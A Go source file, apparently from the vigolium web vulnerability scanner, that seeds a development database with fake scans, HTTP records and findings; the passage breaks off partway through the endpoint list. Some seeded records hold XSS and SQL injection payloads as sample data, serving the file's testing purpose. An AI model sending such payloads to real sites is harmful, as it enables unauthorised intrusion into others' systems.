package cli

import (
	"context"
	"crypto/sha256"
	"fmt"
	"math/rand"
	"strings"
	"time"

	"github.com/spf13/cobra"
	"github.com/vigolium/vigolium/pkg/database"
	"github.com/vigolium/vigolium/pkg/terminal"
)

var dbSeedCmd = &cobra.Command{
	Use:   "seed",
	Short: "Populate database with sample data for development and testing",
	Long:  "Insert a curated set of fake hosts, scans, HTTP records, and findings into the active database. Useful for exercising db, traffic, and finding subcommands without running an actual scan.",
	RunE:  runDBSeed,
}

func init() {
	dbCmd.AddCommand(dbSeedCmd)
}

func runDBSeed(cmd *cobra.Command, args []string) error {
	defer closeDatabaseOnExit()

	db, err := getDB()
	if err != nil {
		return fmt.Errorf("failed to connect to database: %w", err)
	}

	ctx := context.Background()

	// Ensure schema exists (new databases won't have tables yet)
	if err := db.CreateSchema(ctx); err != nil {
		return fmt.Errorf("failed to ensure schema: %w", err)
	}

	rng := rand.New(rand.NewSource(42)) // deterministic for reproducibility

	// Check if seed data already exists
	var existingCount int
	existingCount, err = db.NewSelect().Model((*database.Scan)(nil)).Where("uuid LIKE 'scan-000%'").Count(ctx)
	if err == nil && existingCount > 0 && !globalForce {
		return fmt.Errorf("database already contains seed data (%d seed scans found). Use --force to re-insert (duplicates will be skipped)", existingCount)
	}

	fmt.Printf("%s Seeding database with sample data...\n\n", terminal.InfoSymbol())

	projectUUID, err := resolveProjectUUID()
	if err != nil {
		return err
	}

	// Use ON CONFLICT DO NOTHING so re-running is idempotent
	// --- Users ---
	users := seedUsers()
	for _, u := range users {
		if _, err := db.NewInsert().Model(u).On("CONFLICT DO NOTHING").Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert user %s: %w", u.UUID, err)
		}
	}
	fmt.Printf("  %s Inserted %d users\n", terminal.SuccessSymbol(), len(users))

	// --- Projects ---
	projects := seedProjects(users)
	for _, p := range projects {
		if _, err := db.NewInsert().Model(p).On("CONFLICT DO NOTHING").Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert project %s: %w", p.UUID, err)
		}
	}
	fmt.Printf("  %s Inserted %d projects\n", terminal.SuccessSymbol(), len(projects))

	// --- Scans ---
	scans := seedScans(rng)
	for _, s := range scans {
		s.ProjectUUID = projectUUID
		if _, err := db.NewInsert().Model(s).On("CONFLICT DO NOTHING").Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert scan %s: %w", s.UUID, err)
		}
	}
	fmt.Printf("  %s Inserted %d scans\n", terminal.SuccessSymbol(), len(scans))

	// --- HTTP Records ---
	records := seedHTTPRecords(rng, scans)
	for _, r := range records {
		r.ProjectUUID = projectUUID
		if _, err := db.NewInsert().Model(r).On("CONFLICT DO NOTHING").Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert record %s: %w", r.UUID, err)
		}
	}
	fmt.Printf("  %s Inserted %d HTTP records\n", terminal.SuccessSymbol(), len(records))

	// --- Findings (check by finding_hash to avoid duplicates on re-seed) ---
	findings := seedFindings(rng, records)
	enrichFindings(findings, records)
	findingsInserted := 0
	for _, f := range findings {
		f.ProjectUUID = projectUUID
		exists, _ := db.NewSelect().Model((*database.Finding)(nil)).Where("finding_hash = ?", f.FindingHash).Exists(ctx)
		if exists {
			continue
		}
		if _, err := db.NewInsert().Model(f).Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert finding: %w", err)
		}
		findingsInserted++
	}
	fmt.Printf("  %s Inserted %d findings\n", terminal.SuccessSymbol(), findingsInserted)

	// --- Finding Records (junction table: finding ↔ HTTP record) ---
	findingRecordsInserted := 0
	for _, f := range findings {
		if f.ID == 0 {
			// Look up the finding ID by hash (it was just inserted or already exists)
			var fid int64
			err := db.NewSelect().Model((*database.Finding)(nil)).Column("id").Where("finding_hash = ?", f.FindingHash).Scan(ctx, &fid)
			if err != nil || fid == 0 {
				continue
			}
			f.ID = fid
		}
		for _, recUUID := range f.HTTPRecordUUIDs {
			if _, err := db.NewRaw(
				"INSERT INTO finding_records (finding_id, record_uuid) VALUES (?, ?) ON CONFLICT DO NOTHING",
				f.ID, recUUID,
			).Exec(ctx); err != nil {
				continue // skip on error (e.g. FK violation)
			}
			findingRecordsInserted++
		}
	}
	fmt.Printf("  %s Inserted %d finding_records\n", terminal.SuccessSymbol(), findingRecordsInserted)

	// --- Scopes (check by name to avoid duplicates on re-seed) ---
	scopes := seedScopes()
	scopesInserted := 0
	for _, s := range scopes {
		s.ProjectUUID = projectUUID
		exists, _ := db.NewSelect().Model((*database.Scope)(nil)).Where("name = ?", s.Name).Exists(ctx)
		if exists {
			continue
		}
		if _, err := db.NewInsert().Model(s).Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert scope %s: %w", s.Name, err)
		}
		scopesInserted++
	}
	fmt.Printf("  %s Inserted %d scope rules\n", terminal.SuccessSymbol(), scopesInserted)

	// --- OAST Interactions (check by unique_id to avoid duplicates) ---
	interactions := seedOASTInteractions(scans)
	// Link specific OAST rows to their originating finding via ModuleID heuristic.
	// Findings have their IDs populated by the finding_records loop above.
	moduleIDToFinding := make(map[string]int64, len(findings))
	for _, f := range findings {
		if f.ID > 0 {
			// first-wins preserves the earliest finding for each module ID
			if _, ok := moduleIDToFinding[f.ModuleID]; !ok {
				moduleIDToFinding[f.ModuleID] = f.ID
			}
		}
	}
	oastToFinding := map[string]string{
		"seed-oast-http-002": "ssti-expression-eval", // SSTI blind callback → SSTI finding
		"seed-oast-dns-002":  "xxe-generic",          // XXE DNS callback → XXE finding (none seeded, will be 0)
	}
	oastInserted := 0
	for _, oi := range interactions {
		oi.ProjectUUID = projectUUID
		if mod, ok := oastToFinding[oi.UniqueID]; ok {
			if fid, ok := moduleIDToFinding[mod]; ok {
				oi.FindingID = fid
			}
		}
		exists, _ := db.NewSelect().Model((*database.OASTInteraction)(nil)).Where("unique_id = ?", oi.UniqueID).Exists(ctx)
		if exists {
			continue
		}
		if _, err := db.NewInsert().Model(oi).Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert OAST interaction %s: %w", oi.UniqueID, err)
		}
		oastInserted++
	}
	fmt.Printf("  %s Inserted %d OAST interactions\n", terminal.SuccessSymbol(), oastInserted)

	// --- Scan Logs ---
	scanLogs := seedScanLogs(scans)
	logsInserted := 0
	for _, sl := range scanLogs {
		sl.ProjectUUID = projectUUID
		if _, err := db.NewInsert().Model(sl).On("CONFLICT DO NOTHING").Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert scan log: %w", err)
		}
		logsInserted++
	}
	fmt.Printf("  %s Inserted %d scan logs\n", terminal.SuccessSymbol(), logsInserted)

	// --- Agent Runs ---
	agenticScans := seedAgenticScans(scans)
	agenticScansInserted := 0
	for _, ar := range agenticScans {
		ar.ProjectUUID = projectUUID
		exists, _ := db.NewSelect().Model((*database.AgenticScan)(nil)).Where("uuid = ?", ar.UUID).Exists(ctx)
		if exists {
			continue
		}
		if _, err := db.NewInsert().Model(ar).Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert agent run %s: %w", ar.UUID, err)
		}
		agenticScansInserted++
	}
	fmt.Printf("  %s Inserted %d agent runs\n", terminal.SuccessSymbol(), agenticScansInserted)

	// --- Session Hostnames ---
	sessions := seedAuthenticationHostnames(scans)
	sessionsInserted := 0
	for _, sh := range sessions {
		sh.ProjectUUID = projectUUID
		exists, _ := db.NewSelect().Model((*database.AuthenticationHostname)(nil)).Where("hostname = ? AND session_name = ?", sh.Hostname, sh.SessionName).Exists(ctx)
		if exists {
			continue
		}
		if _, err := db.NewInsert().Model(sh).Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert session hostname %s/%s: %w", sh.Hostname, sh.SessionName, err)
		}
		sessionsInserted++
	}
	fmt.Printf("  %s Inserted %d session hostnames\n", terminal.SuccessSymbol(), sessionsInserted)

	fmt.Printf("\n%s Seed complete! Use 'vigolium db stats' or 'vigolium traffic' to inspect.\n", terminal.SuccessSymbol())
	return nil
}

// ---------------------------------------------------------------------------
// Scan seeds
// ---------------------------------------------------------------------------

func seedScans(rng *rand.Rand) []*database.Scan {
	now := time.Now()
	return []*database.Scan{
		{
			UUID:            "scan-0001-aaaa-bbbb-cccc-ddddeeee0001",
			Name:            "Full scan — example.com",
			Description:     "Complete scan of example.com with all modules enabled",
			Status:          "completed",
			Target:          "https://example.com",
			Modules:         "xss,sqli,lfi,ssti,crlf,openredirect",
			Threads:         10,
			Profile:         "full",
			Tags:            []string{"full-scan", "release-blocker"},
			TriggeredBy:     "user",
			SourcePath:      "/opt/repos/example-frontend",
			SourceType:      database.SourceTypeLocal,
			AgenticScanUUID: "agent-0002-aaaa-bbbb-cccc-ddddeeee0002",
			ScanSource:      "cli",
			ScanMode:        "full",
			StartCursorAt:   now.Add(-2 * time.Hour),
			CursorAt:        now.Add(-1*time.Hour - 45*time.Minute),
			ProcessedCount:  85,
			StartedAt:       now.Add(-2 * time.Hour),
			FinishedAt:      now.Add(-1*time.Hour - 45*time.Minute),
			DurationMs:      900000,
			TotalRequests:   85,
			TotalFindings:   15,
			CriticalCount:   1,
			HighCount:       2,
			MediumCount:     2,
			LowCount:        1,
			InfoCount:       1,
			SuspectCount:    8,
			StorageURL:      "gs://vigolium-scans/proj-default/scan-0001.tar.gz",
			CreatedAt:       now.Add(-2 * time.Hour),
			UpdatedAt:       now.Add(-1*time.Hour - 45*time.Minute),
		},
		{
			UUID:            "scan-0002-aaaa-bbbb-cccc-ddddeeee0002",
			Name:            "API scan — api.shop.local",
			Description:     "REST API scan targeting JSON endpoints",
			Status:          "completed",
			Target:          "https://api.shop.local",
			Modules:         "sqli,ssti,crlf",
			Threads:         5,
			Profile:         "api",
			Tags:            []string{"api-scan", "openapi-driven"},
			TriggeredBy:     "schedule",
			SourcePath:      "https://github.com/vigolium/shop-api",
			SourceType:      database.SourceTypeGitURL,
			AgenticScanUUID: "agent-0003-aaaa-bbbb-cccc-ddddeeee0003",
			ScanSource:      "api",
			ScanMode:        "incremental",
			StartCursorAt:   now.Add(-6 * time.Hour),
			StartCursorUUID: "rec-0001-seed-aaaa-bbbb-cccc0001",
			CursorAt:        now.Add(-4*time.Hour - 30*time.Minute),
			CursorUUID:      "rec-0030-seed-aaaa-bbbb-cccc001e",
			ProcessedCount:  120,
			StartedAt:       now.Add(-5 * time.Hour),
			FinishedAt:      now.Add(-4*time.Hour - 30*time.Minute),
			DurationMs:      1800000,
			TotalRequests:   120,
			TotalFindings:   9,
			HighCount:       1,
			MediumCount:     2,
			InfoCount:       1,
			SuspectCount:    5,
			StorageURL:      "gs://vigolium-scans/proj-default/scan-0002.tar.gz",
			CreatedAt:       now.Add(-5 * time.Hour),
			UpdatedAt:       now.Add(-4*time.Hour - 30*time.Minute),
		},
		{
			UUID:           "scan-0003-aaaa-bbbb-cccc-ddddeeee0003",
			Name:           "Quick XSS check — blog.test",
			Description:    "XSS-only quick scan",
			Status:         "running",
			Target:         "https://blog.test",
			Modules:        "xss",
			Threads:        3,
			Profile:        "light",
			Tags:           []string{"xss-only", "quick"},
			TriggeredBy:    "user",
			ScanSource:     "cli",
			ScanMode:       "full",
			StartCursorAt:  now.Add(-10 * time.Minute),
			CursorAt:       now.Add(-2 * time.Minute),
			ProcessedCount: 18,
			StartedAt:      now.Add(-10 * time.Minute),
			TotalRequests:  30,
			TotalFindings:  2,
			MediumCount:    1,
			SuspectCount:   1,
			CreatedAt:      now.Add(-10 * time.Minute),
			UpdatedAt:      now.Add(-2 * time.Minute),
		},
		{
			UUID:         "scan-0004-aaaa-bbbb-cccc-ddddeeee0004",
			Name:         "Failed scan — unreachable.internal",
			Description:  "Scan that failed due to connection timeout",
			Status:       "failed",
			Target:       "https://unreachable.internal",
			Modules:      "xss,sqli",
			Threads:      5,
			Profile:      "light",
			Tags:         []string{"failed"},
			TriggeredBy:  "user",
			ScanSource:   "cli",
			ScanMode:     "full",
			StartedAt:    now.Add(-24 * time.Hour),
			FinishedAt:   now.Add(-24*time.Hour + 30*time.Second),
			DurationMs:   30000,
			ErrorMessage: "connection timeout after 30s: dial tcp: lookup unreachable.internal: no such host",
			CreatedAt:    now.Add(-24 * time.Hour),
			UpdatedAt:    now.Add(-24*time.Hour + 30*time.Second),
		},
		{
			UUID:           "scan-0005-aaaa-bbbb-cccc-ddddeeee0005",
			Name:           "Scan-on-receive — proxied POST /login",
			Description:    "Auto-scan triggered by ingestion of a POST /login record from the proxy",
			Status:         "completed",
			Target:         "https://example.com/login",
			Modules:        "sqli,xss,sessionfixation",
			Threads:        3,
			Profile:        "light",
			Tags:           []string{"scan-on-receive", "proxy-triggered"},
			TriggeredBy:    "webhook",
			HTTPRecordUUID: "rec-0005-seed-aaaa-bbbb-cccc0005",
			ScanSource:     "scan-on-receive",
			ScanMode:       "incremental",
			StartCursorAt:  now.Add(-20 * time.Minute),
			CursorAt:       now.Add(-18 * time.Minute),
			ProcessedCount: 1,
			StartedAt:      now.Add(-20 * time.Minute),
			FinishedAt:     now.Add(-18 * time.Minute),
			DurationMs:     120000,
			TotalRequests:  12,
			TotalFindings:  1,
			MediumCount:    1,
			CreatedAt:      now.Add(-20 * time.Minute),
			UpdatedAt:      now.Add(-18 * time.Minute),
		},
	}
}

// ---------------------------------------------------------------------------
// HTTP Record seeds
// ---------------------------------------------------------------------------

// seedHost holds reusable host/origin data for building records.
type seedHost struct {
	scheme   string
	hostname string
	port     int
	ip       string
}

var seedHosts = []seedHost{
	{"https", "example.com", 443, "93.184.216.34"},
	{"https", "api.shop.local", 443, "10.0.0.50"},
	{"https", "blog.test", 443, "172.16.0.5"},
	{"http", "legacy.example.com", 80, "93.184.216.35"},
	{"https", "cdn.example.com", 443, "93.184.216.36"},
	{"https", "admin.example.com", 8443, "93.184.216.37"},
}

// seedEndpoint describes a single endpoint template.
type seedEndpoint struct {
	method      string
	path        string
	host        int // index into seedHosts
	scan        int // index into scans slice (-1 = no scan)
	status      int
	phrase      string
	contentType string
	bodyLen     int64
	timeMs      int64
	title       string
	params      []database.EmbeddedParam
	reqCT       string
	reqBody     []byte
	reqAuth     string
	reqHeaders  map[string][]string
	respHeaders map[string][]string
	remarks     []string
	technology  []string
	parentPath  string // path of parent record on same host (empty = no parent)
}

func seedHTTPRecords(_ *rand.Rand, scans []*database.Scan) []*database.HTTPRecord {
	now := time.Now()

	endpoints := []seedEndpoint{
		// ---- example.com (scan 0) ----
		{method: "GET", path: "/", host: 0, scan: 0, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 14520, timeMs: 120, title: "Example Domain — Home",
			reqHeaders:  map[string][]string{"Host": {"example.com"}, "Accept": {"text/html,application/xhtml+xml"}, "User-Agent": {"Mozilla/5.0"}},
			respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}, "Server": {"nginx/1.24"}, "X-Frame-Options": {"SAMEORIGIN"}},
			technology:  []string{"nginx/1.24", "next.js"},
		},
		{method: "GET", path: "/about", host: 0, scan: 0, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 8732, timeMs: 95, title: "About Us — Example",
			reqHeaders: map[string][]string{"Host": {"example.com"}, "Accept": {"text/html"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}, "Cache-Control": {"max-age=3600"}},
		},
		{method: "GET", path: "/contact", host: 0, scan: 0, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 6200, timeMs: 88, title: "Contact — Example",
			reqHeaders: map[string][]string{"Host": {"example.com"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}},
		},
		{method: "GET", path: "/login", host: 0, scan: 0, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 4310, timeMs: 72, title: "Login",
			reqHeaders: map[string][]string{"Host": {"example.com"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}, "Set-Cookie": {"session=abc123; HttpOnly; Secure"}},
		},
		{method: "POST", path: "/login", host: 0, scan: 0, status: 302, phrase: "Found", contentType: "text/html", bodyLen: 0, timeMs: 210, title: "",
			reqCT: "application/x-www-form-urlencoded", reqBody: []byte("username=admin&password=test123"),
			params:     []database.EmbeddedParam{{Name: "username", Value: "admin", Type: "body"}, {Name: "password", Value: "test123", Type: "body"}},
			reqHeaders: map[string][]string{"Host": {"example.com"}, "Content-Type": {"application/x-www-form-urlencoded"}}, respHeaders: map[string][]string{"Location": {"/dashboard"}, "Set-Cookie": {"session=xyz789; HttpOnly; Secure"}},
			remarks: []string{"auth-endpoint", "has-credentials"},
		},
		{method: "GET", path: "/dashboard", host: 0, scan: 0, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 22100, timeMs: 180, title: "Dashboard — Example",
			reqAuth:    "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc",
			reqHeaders: map[string][]string{"Host": {"example.com"}, "Authorization": {"Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}},
			remarks: []string{"authenticated", "jwt-bearer"},
		},
		{method: "GET", path: "/search?q=test&page=1", host: 0, scan: 0, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 9800, timeMs: 145, title: "Search Results — test",
			params:     []database.EmbeddedParam{{Name: "q", Value: "test", Type: "url"}, {Name: "page", Value: "1", Type: "url"}},
			reqHeaders: map[string][]string{"Host": {"example.com"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}},
		},
		{method: "GET", path: "/search?q=<script>alert(1)</script>&page=1", host: 0, scan: 0, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 9500, timeMs: 150, title: "Search Results",
			params:     []database.EmbeddedParam{{Name: "q", Value: "<script>alert(1)</script>", Type: "url"}, {Name: "page", Value: "1", Type: "url"}},
			reqHeaders: map[string][]string{"Host": {"example.com"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}},
			remarks: []string{"reflected-input", "xss-payload"},
		},
		{method: "GET", path: "/profile/1", host: 0, scan: 0, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 7500, timeMs: 130, title: "User Profile",
			reqAuth:    "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc",
			reqHeaders: map[string][]string{"Host": {"example.com"}, "Authorization": {"Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}},
			remarks: []string{"idor-candidate", "authenticated"},
		},
		{method: "GET", path: "/admin/users", host: 0, scan: 0, status: 403, phrase: "Forbidden", contentType: "text/html", bodyLen: 1200, timeMs: 45, title: "403 Forbidden",
			reqHeaders: map[string][]string{"Host": {"example.com"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}},
			remarks: []string{"forbidden-bypass-candidate", "admin-panel"},
		},
		{method: "GET", path: "/nonexistent", host: 0, scan: 0, status: 404, phrase: "Not Found", contentType: "text/html", bodyLen: 2100, timeMs: 30, title: "Page Not Found",
			reqHeaders: map[string][]string{"Host": {"example.com"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}},
		},
		{method: "GET", path: "/assets/style.css", host: 0, scan: 0, status: 200, phrase: "OK", contentType: "text/css", bodyLen: 45200, timeMs: 15, title: "",
			reqHeaders: map[string][]string{"Host": {"example.com"}, "Accept": {"text/css,*/*"}}, respHeaders: map[string][]string{"Content-Type": {"text/css"}, "Cache-Control": {"public, max-age=31536000"}},
		},
		{method: "GET", path: "/assets/app.js", host: 0, scan: 0, status: 200, phrase: "OK", contentType: "application/javascript", bodyLen: 128000, timeMs: 22, title: "",
			reqHeaders: map[string][]string{"Host": {"example.com"}}, respHeaders: map[string][]string{"Content-Type": {"application/javascript"}, "Cache-Control": {"public, max-age=31536000"}},
		},
		{method: "GET", path: "/robots.txt", host: 0, scan: 0, status: 200, phrase: "OK", contentType: "text/plain", bodyLen: 150, timeMs: 8, title: "",
			reqHeaders: map[string][]string{"Host": {"example.com"}}, respHeaders: map[string][]string{"Content-Type": {"text/plain"}},
		},
		{method: "GET", path: "/sitemap.xml", host: 0, scan: 0, status: 200, phrase: "OK", contentType: "application/xml", bodyLen: 3200, timeMs: 18, title: "",
			reqHeaders: map[string][]string{"Host": {"example.com"}}, respHeaders: map[string][]string{"Content-Type": {"application/xml"}},
		},

		// ---- api.shop.local (scan 1) — JSON API ----
		{method: "GET", path: "/api/v1/products", host: 1, scan: 1, status: 200, phrase: "OK", contentType: "application/json", bodyLen: 34500, timeMs: 85, title: "",
			reqAuth:    "Bearer shop-api-token-abc123",
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}, "Accept": {"application/json"}, "Authorization": {"Bearer shop-api-token-abc123"}}, respHeaders: map[string][]string{"Content-Type": {"application/json"}, "X-RateLimit-Remaining": {"98"}},
			technology: []string{"fastapi", "python/3.11", "uvicorn"},
		},
		{method: "GET", path: "/api/v1/products/42", host: 1, scan: 1, status: 200, phrase: "OK", contentType: "application/json", bodyLen: 1250, timeMs: 35, title: "",
			reqAuth:    "Bearer shop-api-token-abc123",
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}, "Authorization": {"Bearer shop-api-token-abc123"}}, respHeaders: map[string][]string{"Content-Type": {"application/json"}},
		},
		{method: "POST", path: "/api/v1/products", host: 1, scan: 1, status: 201, phrase: "Created", contentType: "application/json", bodyLen: 580, timeMs: 120, title: "",
			reqCT: "application/json", reqBody: []byte(`{"name":"Widget Pro","price":29.99,"category":"electronics"}`),
			params:     []database.EmbeddedParam{{Name: "name", Value: "Widget Pro", Type: "json"}, {Name: "price", Value: "29.99", Type: "json"}, {Name: "category", Value: "electronics", Type: "json"}},
			reqAuth:    "Bearer shop-api-token-abc123",
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}, "Content-Type": {"application/json"}, "Authorization": {"Bearer shop-api-token-abc123"}}, respHeaders: map[string][]string{"Content-Type": {"application/json"}, "Location": {"/api/v1/products/101"}},
		},
		{method: "PUT", path: "/api/v1/products/42", host: 1, scan: 1, status: 200, phrase: "OK", contentType: "application/json", bodyLen: 600, timeMs: 95, title: "",
			reqCT: "application/json", reqBody: []byte(`{"name":"Widget Pro v2","price":34.99}`),
			params:     []database.EmbeddedParam{{Name: "name", Value: "Widget Pro v2", Type: "json"}, {Name: "price", Value: "34.99", Type: "json"}},
			reqAuth:    "Bearer shop-api-token-abc123",
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}, "Content-Type": {"application/json"}, "Authorization": {"Bearer shop-api-token-abc123"}}, respHeaders: map[string][]string{"Content-Type": {"application/json"}},
		},
		{method: "DELETE", path: "/api/v1/products/99", host: 1, scan: 1, status: 204, phrase: "No Content", contentType: "", bodyLen: 0, timeMs: 55, title: "",
			reqAuth:    "Bearer shop-api-token-abc123",
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}, "Authorization": {"Bearer shop-api-token-abc123"}}, respHeaders: map[string][]string{},
		},
		{method: "PATCH", path: "/api/v1/products/42", host: 1, scan: 1, status: 200, phrase: "OK", contentType: "application/json", bodyLen: 620, timeMs: 78, title: "",
			reqCT: "application/json", reqBody: []byte(`{"price":39.99}`),
			params:     []database.EmbeddedParam{{Name: "price", Value: "39.99", Type: "json"}},
			reqAuth:    "Bearer shop-api-token-abc123",
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}, "Content-Type": {"application/json"}, "Authorization": {"Bearer shop-api-token-abc123"}}, respHeaders: map[string][]string{"Content-Type": {"application/json"}},
		},
		{method: "GET", path: "/api/v1/orders?status=pending&limit=10", host: 1, scan: 1, status: 200, phrase: "OK", contentType: "application/json", bodyLen: 8900, timeMs: 110, title: "",
			params:     []database.EmbeddedParam{{Name: "status", Value: "pending", Type: "url"}, {Name: "limit", Value: "10", Type: "url"}},
			reqAuth:    "Bearer shop-api-token-abc123",
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}, "Authorization": {"Bearer shop-api-token-abc123"}}, respHeaders: map[string][]string{"Content-Type": {"application/json"}, "X-Total-Count": {"47"}},
		},
		{method: "POST", path: "/api/v1/orders", host: 1, scan: 1, status: 201, phrase: "Created", contentType: "application/json", bodyLen: 920, timeMs: 250, title: "",
			reqCT: "application/json", reqBody: []byte(`{"product_id":42,"quantity":2,"shipping":"express"}`),
			params:     []database.EmbeddedParam{{Name: "product_id", Value: "42", Type: "json"}, {Name: "quantity", Value: "2", Type: "json"}, {Name: "shipping", Value: "express", Type: "json"}},
			reqAuth:    "Bearer shop-api-token-abc123",
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}, "Content-Type": {"application/json"}, "Authorization": {"Bearer shop-api-token-abc123"}}, respHeaders: map[string][]string{"Content-Type": {"application/json"}, "Location": {"/api/v1/orders/501"}},
		},
		{method: "GET", path: "/api/v1/users/me", host: 1, scan: 1, status: 200, phrase: "OK", contentType: "application/json", bodyLen: 480, timeMs: 42, title: "",
			reqAuth:    "Bearer shop-api-token-abc123",
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}, "Authorization": {"Bearer shop-api-token-abc123"}}, respHeaders: map[string][]string{"Content-Type": {"application/json"}},
		},
		{method: "GET", path: "/api/v1/users/1' OR 1=1--", host: 1, scan: 1, status: 500, phrase: "Internal Server Error", contentType: "application/json", bodyLen: 320, timeMs: 1200, title: "",
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}}, respHeaders: map[string][]string{"Content-Type": {"application/json"}},
			remarks: []string{"sqli-error", "server-error", "high-response-time"},
		},
		{method: "GET", path: "/api/v1/health", host: 1, scan: 1, status: 200, phrase: "OK", contentType: "application/json", bodyLen: 45, timeMs: 5, title: "",
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}}, respHeaders: map[string][]string{"Content-Type": {"application/json"}},
		},
		{method: "POST", path: "/api/v1/auth/login", host: 1, scan: 1, status: 200, phrase: "OK", contentType: "application/json", bodyLen: 350, timeMs: 180, title: "",
			reqCT: "application/json", reqBody: []byte(`{"email":"user@shop.local","password":"s3cure!"}`),
			params:     []database.EmbeddedParam{{Name: "email", Value: "user@shop.local", Type: "json"}, {Name: "password", Value: "s3cure!", Type: "json"}},
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}, "Content-Type": {"application/json"}}, respHeaders: map[string][]string{"Content-Type": {"application/json"}, "Set-Cookie": {"token=jwt-abc; HttpOnly; Secure; SameSite=Strict"}},
			remarks: []string{"auth-endpoint", "has-credentials", "sets-jwt"},
		},
		{method: "GET", path: "/api/v1/products?search='+UNION+SELECT+1,2,3--", host: 1, scan: 1, status: 200, phrase: "OK", contentType: "application/json", bodyLen: 15000, timeMs: 850, title: "",
			params:     []database.EmbeddedParam{{Name: "search", Value: "'+UNION+SELECT+1,2,3--", Type: "url"}},
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}}, respHeaders: map[string][]string{"Content-Type": {"application/json"}},
			remarks: []string{"sqli-union", "high-response-time", "data-leak"},
		},
		{method: "GET", path: "/api/v1/unauthorized-endpoint", host: 1, scan: 1, status: 401, phrase: "Unauthorized", contentType: "application/json", bodyLen: 85, timeMs: 12, title: "",
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}}, respHeaders: map[string][]string{"Content-Type": {"application/json"}, "WWW-Authenticate": {"Bearer"}},
		},
		{method: "OPTIONS", path: "/api/v1/products", host: 1, scan: 1, status: 204, phrase: "No Content", contentType: "", bodyLen: 0, timeMs: 3, title: "",
			reqHeaders: map[string][]string{"Host": {"api.shop.local"}, "Origin": {"https://shop.local"}, "Access-Control-Request-Method": {"POST"}}, respHeaders: map[string][]string{"Access-Control-Allow-Origin": {"https://shop.local"}, "Access-Control-Allow-Methods": {"GET,POST,PUT,DELETE"}},
		},

		// ---- blog.test (scan 2) ----
		{method: "GET", path: "/", host: 2, scan: 2, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 18200, timeMs: 200, title: "Blog — Latest Posts",
			reqHeaders: map[string][]string{"Host": {"blog.test"}, "Accept": {"text/html"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}, "Server": {"Apache/2.4"}},
			technology: []string{"apache/2.4", "ruby-on-rails"},
		},
		{method: "GET", path: "/post/hello-world", host: 2, scan: 2, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 12400, timeMs: 175, title: "Hello World — Blog",
			reqHeaders: map[string][]string{"Host": {"blog.test"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}},
			parentPath: "/",
		},
		{method: "GET", path: "/post/sql-injection-101", host: 2, scan: 2, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 15800, timeMs: 190, title: "SQL Injection 101 — Blog",
			reqHeaders: map[string][]string{"Host": {"blog.test"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}},
			parentPath: "/",
		},
		{method: "POST", path: "/post/hello-world/comment", host: 2, scan: 2, status: 201, phrase: "Created", contentType: "text/html", bodyLen: 350, timeMs: 220, title: "",
			reqCT: "application/x-www-form-urlencoded", reqBody: []byte("author=Alice&body=Great+post!&email=alice@test.com"),
			params:     []database.EmbeddedParam{{Name: "author", Value: "Alice", Type: "body"}, {Name: "body", Value: "Great post!", Type: "body"}, {Name: "email", Value: "alice@test.com", Type: "body"}},
			reqHeaders: map[string][]string{"Host": {"blog.test"}, "Content-Type": {"application/x-www-form-urlencoded"}, "Cookie": {"session=blogsess123"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}, "Location": {"/post/hello-world#comment-5"}},
		},
		{method: "GET", path: "/tag/security", host: 2, scan: 2, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 9200, timeMs: 135, title: "Posts tagged 'security'",
